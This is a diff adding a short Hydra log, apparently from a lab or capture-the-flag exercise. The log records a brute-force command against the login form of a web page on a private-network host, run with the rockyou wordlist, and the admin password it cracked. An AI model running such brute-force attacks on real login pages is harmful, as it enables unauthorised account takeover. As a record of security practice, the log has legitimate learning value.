@@ -1,0 +1,2 @@
+# Hydra v8.8 run at 2019-05-30 12:05:29 on 192.168.0.30 http-get-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz -F -o hydra.log 192.168.0.30 http-get-form /index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif)
+[80][http-get-form] host: 192.168.0.30   login: admin   password: shadow
